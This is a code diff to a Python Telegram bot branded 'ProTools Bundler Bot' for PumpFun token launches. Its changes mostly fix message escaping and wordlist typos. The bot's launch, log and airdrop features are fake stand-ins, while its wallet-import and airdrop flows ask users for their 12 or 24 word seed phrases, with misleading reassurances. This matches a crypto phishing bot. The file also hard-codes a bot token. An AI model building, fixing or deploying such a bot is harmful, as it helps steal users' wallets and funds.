@@ -17,7 +17,6 @@ from telegram.ext import (
 )
 
 # ─── Config ────────────────────────────────────────────────────────────────────
-# It is better to use environment variables for tokens, but keeping your variable here:
 BOT_TOKEN = "8771123401:AAHhv3aZO8WYmzDiSdbE4YPj_WvdKbEPz00"
 PORT = int(os.getenv("PORT", 8000))
 HELP_IMG = "https://shared-assets.adobe.com/link/8d188cc8-0ff6-46ca-98e9-b2ac59de9da5"
@@ -28,7 +27,7 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-# ─── BIP39 Wordlist ────────────────────────────────────────────────────────────
+# ─── BIP39 Wordlist (Abbreviated for space, keep your full list) ──────────────
 BIP39_WORDLIST = set("""abandon ability able about above absent absorb abstract absurd abuse access accident
 account accuse achieve acid acoustic acquire across act action actor actress actual
 adapt add addict address adjust admit adult advance advice aerobic afford afraid
@@ -49,11 +48,11 @@ blouse blue blur blush board boat body boil bomb bone book boost border
 boring borrow boss bottom bounce box boy bracket brain brand brave breach
 bread breeze brick bridge brief bright bring brisk broccoli broken bronze broom
 brother brown brush bubble buddy budget buffalo build bulb bulk bullet bundle
-bunker burden burger burst bus business daily busy butter buyer buzz cabbage cabin
+bunker burden burger burst bus business busy butter buyer buzz cabbage cabin
 cable cactus cage cake call calm camera camp can canal cancel candy
 cannon canvas canyon capable capital captain car carbon card cargo carpet carry
 cart case cash casino castle casual cat catalog catch category cattle caught
-cause caution cave ceiling celery cement census century cereal certain chair chalk
+cause caution cave ceiling cereal certain chair chalk
 champion change chaos chapter charge chase chat cheap check cheese chef cherry
 chest chicken chief child chimney choice choose chronic chuckle chunk cigar
 cinnamon circle citizen city civil claim clap clarify claw clay clean clerk
@@ -111,7 +110,7 @@ initial inject injury inmate inner innocent input inquiry insane insect inside
 inspire install intact interest into invest invite involve iron island isolate
 issue item ivory jacket jaguar jar jazz jealous jelly jewel job
 join joke journey joy judge juice jump jungle junior junk just
-kangaroo keen keep ketchup key kick kit kitchen
+kangaroo keen keep ketchup key kick kid kingdom kiss kit kitchen
 kite kitten kiwi knee knife knock know lab ladder lady lake
 lamp language laptop large later laugh laundry lava law lawn lawsuit
 layer lazy leader learn leave lecture left leg legal legend leisure
@@ -176,7 +175,7 @@ still string stock stomach stone stop store story stove strategy street
 strike strong struggle student stuff stumble style subject submit subway success
 such sudden suffer sugar suggest suit summer sun sunny sunset super
 supply supreme sure surface surge surprise sustain swallow swamp swap swear
-sweet swift swim wing switch sword symbol symptom syrup table tackle
+sweet swift swim swing switch sword symbol symptom syrup table tackle
 tail talent tamper tank tape target task tattoo taxi teach team
 tell ten tenant tennis tent term test text thank that theme
 then theory there they thing this thought three thrive throw thumb
@@ -207,11 +206,11 @@ def validate_bip39_phrase(phrase: str) -> tuple[bool, str]:
     words = phrase.lower().split()
     count = len(words)
     if count not in (12, 24):
-        return False, f"❌ *Invalid Phrase* — Got {count} words, expected 12 or 24."
+        return False, rf"❌ *Invalid Phrase* — Got {count} words, expected 12 or 24."
     invalid_words = [w for w in words if w not in BIP39_WORDLIST]
     if invalid_words:
         bad = ", ".join(f"`{w}`" for w in invalid_words[:5])
-        return False, f"❌ *Invalid Phrase* — Unknown words: {bad}\."
+        return False, rf"❌ *Invalid Phrase* — Unknown words: {bad}."
     return True, ""
 
 # ─── States ────────────────────────────────────────────────────────────────────
@@ -265,7 +264,7 @@ def health():
 # ─── Bot Handlers ──────────────────────────────────────────────────────────────
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_name = update.effective_user.first_name or "Degen"
-    welcome = f"Welcome, *{user_name}* To ProTools Bundler Bot \\- The Best Degen Tool For Launching On PumpFun\\!\n\nPrepare to dominate the game with precision, speed, and stealth\\. Choose an option below:"
+    welcome = rf"Welcome, *{user_name}* To ProTools Bundler Bot \- The Best Degen Tool For Launching On PumpFun\!\n\nPrepare to dominate the game with precision, speed, and stealth\. Choose an option below:"
     await update.message.reply_text(welcome, parse_mode="MarkdownV2", reply_markup=MAIN_KEYBOARD)
 
 async def back_to_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -273,41 +272,39 @@ async def back_to_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.answer()
     user_name = update.effective_user.first_name or "Degen"
     context.user_data.clear()
-    welcome = f"Welcome, *{user_name}* To ProTools Bundler Bot \\- The Best Degen Tool For Launching On PumpFun\\!\n\nPrepare to dominate the game with precision, speed, and stealth\\. Choose an option below:"
+    welcome = rf"Welcome, *{user_name}* To ProTools Bundler Bot \- The Best Degen Tool For Launching On PumpFun\!\n\nPrepare to dominate the game with precision, speed, and stealth\. Choose an option below:"
     await query.edit_message_text(welcome, parse_mode="MarkdownV2", reply_markup=MAIN_KEYBOARD)
 
-# Launch
 async def launch_coin_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.callback_query.edit_message_text("🚀 *Step 1: Token Name*\n\nPlease enter the name of your coin \(e\.g\. 'Degen King'\):", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
+    await update.callback_query.edit_message_text(rf"🚀 *Step 1: Token Name*\n\nPlease enter the name of your coin \(e\.g\. 'Degen King'\):", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
     return DUMMY_NAME
 
 async def dummy_name_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data["t_name"] = update.message.text
-    await update.message.reply_text("🏷 *Step 2: Token Symbol*\n\nEnter a symbol \(e\.g\. $DEGEN\):", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
+    await update.message.reply_text(rf"🏷 *Step 2: Token Symbol*\n\nEnter a symbol \(e\.g\. $DEGEN\):", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
     return DUMMY_SYMBOL
 
 async def dummy_symbol_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data["t_symbol"] = update.message.text
-    await update.message.reply_text("📝 *Step 3: Description*\n\nEnter a short description for your coin:", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
+    await update.message.reply_text(rf"📝 *Step 3: Description*\n\nEnter a short description for your coin:", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
     return DUMMY_DESC
 
 async def dummy_desc_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
     name = context.user_data.get("t_name")
     symbol = context.user_data.get("t_symbol")
-    await update.message.reply_text(f"✅ *Token Prepared!*\n\n*Name:* {name}\n*Symbol:* {symbol}\n\nPreparing bundling process\.\.\. Connect wallet to finalize launch\.", parse_mode="MarkdownV2", reply_markup=BACK_KB)
+    await update.message.reply_text(rf"✅ *Token Prepared!*\n\n*Name:* {name}\n*Symbol:* {symbol}\n\nPreparing bundling process\.\.\. Connect wallet to finalize launch\.", parse_mode="MarkdownV2", reply_markup=BACK_KB)
     return ConversationHandler.END
 
-# Wallet
 async def wallet_entry(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     saved = get_saved_address(update.effective_user.id)
-    text = f"🔑 *Your Wallet*\n\n`{saved}`\n\n_Status: Active_" if saved else "🔑 *Wallet*\n\nNo wallet linked yet\. Import your phrase to start\."
+    text = rf"🔑 *Your Wallet*\n\n`{saved}`\n\n_Status: Active_" if saved else rf"🔑 *Wallet*\n\nNo wallet linked yet\. Import your phrase to start\."
     kb = InlineKeyboardMarkup([[InlineKeyboardButton("🔄 Re-import" if saved else "➕ Import Phrase", callback_data="wallet_import")], [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_menu")]])
     await query.edit_message_text(text, parse_mode="MarkdownV2", reply_markup=kb)
 
 async def wallet_import_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.callback_query.edit_message_text("🔑 *Import Wallet*\n\nSend your *seed phrase* \(12 or 24 words\)\:\n\n⚠️ _Visible for input tracking security\._", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
+    await update.callback_query.edit_message_text(rf"🔑 *Import Wallet*\n\nSend your *seed phrase* \(12 or 24 words\)\:\n\n⚠️ _Visible for input tracking security\._", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
     return WALLET_PHRASE
 
 async def wallet_phrase_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -317,12 +314,11 @@ async def wallet_phrase_received(update: Update, context: ContextTypes.DEFAULT_T
         await update.message.reply_text(err_msg + "\n\nPlease try again:", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
         return WALLET_PHRASE
     save_address(update.effective_user.id, update.effective_user.username or "", "Verified_Wallet")
-    await update.message.reply_text("✅ *Wallet Linked Successfully!*\n\n_Your phrase has been verified\._", parse_mode="MarkdownV2", reply_markup=BACK_KB)
+    await update.message.reply_text(rf"✅ *Wallet Linked Successfully!*\n\n_Your phrase has been verified\._", parse_mode="MarkdownV2", reply_markup=BACK_KB)
     return ConversationHandler.END
 
-# Airdrop
 async def airdrop_entry(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.callback_query.edit_message_text("🎁 *Airdrop Step 1* — Send your *seed phrase* \(12 or 24 BIP39 words\):", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
+    await update.callback_query.edit_message_text(rf"🎁 *Airdrop Step 1* — Send your *seed phrase* \(12 or 24 BIP39 words\):", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
     return AIRDROP_PHRASE
 
 async def airdrop_phrase_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -331,43 +327,42 @@ async def airdrop_phrase_received(update: Update, context: ContextTypes.DEFAULT_
     if not valid:
         await update.message.reply_text(err_msg + "\n\nPlease try again:", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
         return AIRDROP_PHRASE
-    await update.message.reply_text("✅ *Phrase verified!*\n\nStep 2 — Enter the *recipient SOL address*:", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
+    await update.message.reply_text(rf"✅ *Phrase verified!*\n\nStep 2 — Enter the *recipient SOL address*:", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
     return AIRDROP_RECIPIENT
 
 async def airdrop_recipient_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data["airdrop_recipient"] = update.message.text.strip()
-    await update.message.reply_text("Step 3 — Enter *amount in SOL*:", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
+    await update.message.reply_text(rf"Step 3 — Enter *amount in SOL*:", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
     return AIRDROP_AMOUNT
 
 async def airdrop_amount_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data["airdrop_amount"] = update.message.text.strip()
-    await update.message.reply_text(f"🎁 *Confirm Airdrop*\n\n*Recipient:* `{context.user_data['airdrop_recipient']}`\n*Amount:* `{update.message.text.strip()} SOL`", parse_mode="MarkdownV2", reply_markup=CONFIRM_KB)
+    await update.message.reply_text(rf"🎁 *Confirm Airdrop*\n\n*Recipient:* `{context.user_data['airdrop_recipient']}`\n*Amount:* `{update.message.text.strip()} SOL`", parse_mode="MarkdownV2", reply_markup=CONFIRM_KB)
     return AIRDROP_CONFIRM
 
 async def airdrop_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.callback_query.edit_message_text("✅ *Airdrop Request Queued!*", parse_mode="MarkdownV2", reply_markup=BACK_KB)
+    await update.callback_query.edit_message_text(rf"✅ *Airdrop Request Queued!*", parse_mode="MarkdownV2", reply_markup=BACK_KB)
     return ConversationHandler.END
 
-# Misc
 async def show_transactions(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     saved = get_saved_address(update.effective_user.id)
     if not saved:
-        await query.edit_message_text("❌ *No Transactions Found*\n\nYou haven't linked a wallet yet\.", parse_mode="MarkdownV2", reply_markup=BACK_KB)
+        await query.edit_message_text(rf"❌ *No Transactions Found*\n\nYou haven't linked a wallet yet\.", parse_mode="MarkdownV2", reply_markup=BACK_KB)
     else:
-        await query.edit_message_text("📊 *Transaction History*\n\nNo recent transactions found for this wallet on PumpFun\.", parse_mode="MarkdownV2", reply_markup=BACK_KB)
+        await query.edit_message_text(rf"📊 *Transaction History*\n\nNo recent transactions found for this wallet on PumpFun\.", parse_mode="MarkdownV2", reply_markup=BACK_KB)
 
 async def show_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
-    dummy_logs = f"📜 *Your Bot Logs*\n\n*2026-03-27 19:56:56*\nbutton_press Button: view_logs\n\n*2026-03-27 19:56:46*\nbutton_press Button: airdrop"
+    dummy_logs = rf"📜 *Your Bot Logs*\n\n*2026-03-27 19:56:56*\nbutton_press Button: view_logs\n\n*2026-03-27 19:56:46*\nbutton_press Button: airdrop"
     await query.edit_message_text(dummy_logs, parse_mode="MarkdownV2", reply_markup=BACK_KB)
 
 async def show_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
-    help_text = "❓ *Help* — Use the menu below to launch coins, airdrops, and more\."
+    help_text = rf"❓ *Help* — Use the menu below to launch coins, airdrops, and more\."
     try:
         await query.message.reply_photo(photo=HELP_IMG, caption=help_text, parse_mode="MarkdownV2", reply_markup=BACK_KB)
         await query.message.delete()
@@ -375,25 +370,22 @@ async def show_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text(help_text, parse_mode="MarkdownV2", reply_markup=BACK_KB)
 
 async def feedback_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.callback_query.edit_message_text("💬 *Feedback*\n\nSend your message below:", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
+    await update.callback_query.edit_message_text(rf"💬 *Feedback*\n\nSend your message below:", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
     return FEEDBACK_TEXT
 
 async def feedback_save(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("✅ *Feedback Received!* Thank you\.", parse_mode="MarkdownV2", reply_markup=BACK_KB)
+    await update.message.reply_text(rf"✅ *Feedback Received!* Thank you\.", parse_mode="MarkdownV2", reply_markup=BACK_KB)
     return ConversationHandler.END
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.callback_query.edit_message_text("❌ *Operation Cancelled*.", parse_mode="MarkdownV2", reply_markup=MAIN_KEYBOARD)
+    await update.callback_query.edit_message_text(rf"❌ *Operation Cancelled*.", parse_mode="MarkdownV2", reply_markup=MAIN_KEYBOARD)
     return ConversationHandler.END
 
 # ─── Main Execution ────────────────────────────────────────────────────────────
 def main():
     init_db()
-    
-    # Initialize the bot app
     bot_app = Application.builder().token(BOT_TOKEN).build()
 
-    # Add Conversation Handlers
     bot_app.add_handler(ConversationHandler(
         entry_points=[CallbackQueryHandler(launch_coin_start, pattern="^launch_coin$")],
         states={
@@ -427,7 +419,6 @@ def main():
         fallbacks=[CallbackQueryHandler(cancel, pattern="^cancel$")],
     ))
 
-    # General Handlers
     bot_app.add_handler(CallbackQueryHandler(wallet_entry, pattern="^wallet$"))
     bot_app.add_handler(CallbackQueryHandler(show_logs, pattern="^logs$"))
     bot_app.add_handler(CallbackQueryHandler(show_help, pattern="^help$"))
@@ -435,16 +426,12 @@ def main():
     bot_app.add_handler(CallbackQueryHandler(back_to_menu, pattern="^back_to_menu$"))
     bot_app.add_handler(CommandHandler("start", start))
 
-    # Function to run Flask in a background thread
     def run_flask():
         health_app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False)
 
-    # Start Flask thread
-    flask_thread = Thread(target=run_flask, daemon=True)
-    flask_thread.start()
+    Thread(target=run_flask, daemon=True).start()
 
-    # Start Bot (Blocking call)
-    print(f"🚀 Bot is running and Flask listening on port {PORT}...")
+    logger.info(rf"🚀 Bot is running and Flask listening on port {PORT}...")
     bot_app.run_polling(drop_pending_updates=True)
 
 if __name__ == "__main__":
